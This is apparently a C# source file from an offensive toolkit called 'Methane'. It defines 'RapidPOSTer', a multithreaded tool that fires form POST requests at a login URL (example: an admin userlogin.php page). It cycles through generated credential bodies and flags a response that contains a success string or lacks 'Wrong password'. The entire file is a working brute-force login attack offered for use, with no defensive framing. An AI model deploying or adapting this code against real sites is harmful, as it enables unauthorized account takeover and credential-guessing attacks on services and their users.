using System;
using System.Collections.Generic;
using System.IO;
using System.Net;

namespace Methane.Toolkit
{
    public class RapidPOSTer
    {

        readonly UI UI;
        public RapidPOSTer(UI ui)
        {
            UI = ui;
        }

        public string findWith;
        public bool hasFindWith;
        public bool hasFindWithout;
        public string findWithout;
        public string url;

        public bool found;
        public string foundPass;
        public int runningThrds;
        public int AllowedThrds;

        public CSA csa;
        IEnumerator<string> bodyPipeline;

        public bool HasCookie = false;
        public bool HasHeaders = false;
        public string Cookie;
        public string Headers;

        public void PromptParamenters()
        {
            found = false;
            runningThrds = 0;

            UI.Log("---------------------------------");
            UI.Log("|           Methane             |");
            UI.Log("|     Rapid HTTP Request        |");
            UI.Log("|           POSTer              |");
            UI.Log("---------------------------------");

            url = UI.Prompt("Enter Request URL (Ex :- http://DamnWebSite.com/admin/userlogin.php ) : ");

            ChooseCookies:
            Cookie = UI.Prompt("Enter cookies to use OR Enter ~filename to read cookies OR [Enter] not to use cookies");

            HasCookie = Cookie.Length != 0;
            if (Cookie.StartsWith('~'))
            {
                if (Cookie == "~") Cookie = "~cookie.txt";
                try
                {
                    Cookie = File.ReadAllText(Cookie.TrimStart('~'));
                }
                catch (Exception ex)
                {
                    UI.LogError(ex);
                    goto ChooseCookies;
                }
            }

            ChooseHeaders:
            Headers = UI.Prompt("Enter Headers to use OR Enter ~filename to read Headers OR [Enter] not to use Headers");

            HasHeaders = Headers.Length != 0;
            if (Headers.StartsWith('~'))
            {
                if (Headers == "~") Headers = "~headers.txt";
                try
                {
                    Headers = File.ReadAllText(Headers.TrimStart('~'));
                }
                catch (Exception ex)
                {
                    UI.LogError(ex);
                    goto ChooseHeaders;
                }
            }


            findWith = UI.Prompt("In a positive response, what text we would find? (Ex :- Wellcome) [or null]");
            hasFindWith = findWith.Length != 0;
            findWithout = UI.Prompt("In a positive response, what text we won't find? (Ex :- Wrong password) [or null]");
            hasFindWithout = findWithout.Length != 0;

            UI.Log("Please use the following tool to create POST body data string list");
            csa = new CSA(UI);
            csa.PromptParamenters();


            PromtHowManyThreads:
            if (!int.TryParse(UI.Prompt("How many threads to use?"), out AllowedThrds)) goto PromtHowManyThreads;

            UI.Log("Rapid POSTer standby    :-) ");

        }



        public string Run()
        {


            UI.Log("Rapid POSTer Running...");


            bodyPipeline = csa.RunIterator();

            for (int n = 0; n < AllowedThrds; n++)
            {
                new System.Threading.Thread(new System.Threading.ThreadStart(ThrLoop)) { Name = $"POST Thrd {n}" }.Start();
                System.Threading.Thread.Sleep(10);
            }


            while (runningThrds != 0)
            {
                System.Threading.Thread.Sleep(100);
            }

            if (found)
            {
                UI.Prompt($"We found it!!! '{foundPass}'     ________");
            }
            else
            {
                UI.Prompt("I can't find it  :-(              ________");
            }

            return foundPass;
        }



        int Report = 0;
        private void ThrLoop()
        {

            runningThrds++;



            bodyPipelineMoveNext:

            if (found) { runningThrds--; return; }

            string poststring;
            lock (bodyPipeline)
            {
                if (bodyPipeline.MoveNext())
                {
                    poststring = bodyPipeline.Current;
                }
                else
                {
                    runningThrds--;
                    return;
                }
            }



            try
            {

                string resp = PostForm(url, poststring, Cookie, Headers);

                if ((hasFindWith && resp.Contains(findWith)) || (hasFindWithout && !resp.Contains(findWithout)))
                {
                    UI.LogSpecial($"We found it! '{poststring}' _______ :-) ________________________________ \n Response : \n{resp} \n \n");
                    //found = true;
                    //foundPass = poststring;

                    //runningThrds--; return;
                }
                else
                {
                    UI.Log($"{poststring} didn't work");
                    Report++;
                    if (Report % 1000 == 0)
                    {
                        UI.Log($"Reporting Invalid Respose {resp}");
                    }
                }

            }
            catch (Exception ex)
            {
                UI.Log($"!!! Error {ex} - {ex.Message} @ {ex.StackTrace}");
            }

            goto bodyPipelineMoveNext;

        }


        public static string PostForm(string url, string poststring, string Cookie = "", string Headers = "")
        {
            var wr = WebRequest.CreateHttp(url);
            wr.Method = "POST";
            wr.ContentType = "application/x-www-form-urlencoded";

            if (Cookie.Length != 0) wr.Headers.Add(HttpRequestHeader.Cookie, Cookie);

            if (Headers.Length != 0)
                foreach (string header in Headers.Split("\n"))
                    wr.Headers.Add(header);



            byte[] bytedata = System.Text.Encoding.UTF8.GetBytes(poststring);
            wr.ContentLength = bytedata.Length;

            // Create the stream
            Stream requestStream = wr.GetRequestStream();
            requestStream.Write(bytedata, 0, bytedata.Length);
            requestStream.Close();

            // Get the response from remote server
            HttpWebResponse httpWebResponse = (HttpWebResponse)wr.GetResponse();
            Stream responseStream = httpWebResponse.GetResponseStream();

            System.Text.StringBuilder sb = new System.Text.StringBuilder();
            using (StreamReader reader = new StreamReader(responseStream, System.Text.Encoding.UTF8))
            {
                string line;
                while ((line = reader.ReadLine()) != null)
                {
                    sb.AppendLine(line);
                }
            }

            string resp = sb.ToString();
            return resp;
        }
    }
}
